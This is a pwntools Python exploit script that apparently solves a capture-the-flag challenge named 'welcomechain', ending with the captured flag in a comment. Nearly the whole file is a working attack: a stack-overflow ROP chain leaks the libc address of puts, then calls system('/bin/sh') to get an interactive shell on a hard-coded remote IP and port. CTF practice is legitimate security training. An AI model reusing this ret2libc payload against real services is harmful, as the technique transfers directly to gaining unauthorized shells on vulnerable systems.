from pwn import *


binpath = './welcomechain'
elf = ELF(binpath)
libc = elf.libc
libc = ELF('./libc.so.6')

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']


gdbscript = '''
gef
# b main
b *0x4007b9
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('114.177.250.4', 2226)

pop_rdi = 0x400853
ret = 0x400576

io.recvuntil(b'Please Input : ')
payload = b''
payload += b'A' * 0x28
# puts(&puts)
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
io.sendline(payload)

io.recvuntil(b'Your input is : ')
io.recvline()

data = io.recvline().rstrip()
addr_libc = u64(data.ljust(8, b'\x00')) - libc.symbols['puts']
print("addr_libc = 0x{:x}".format(addr_libc))

io.recvuntil(b'Please Input : ')
payload = b''
payload += b'B' * 0x28
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(addr_libc + next(libc.search(b'/bin/sh')))
payload += p64(addr_libc + libc.symbols['system'])
io.sendline(payload)


io.interactive()


# ctrctf{W31c0m3!_c0ntr4i1_ctf_r3t2l1bc!}
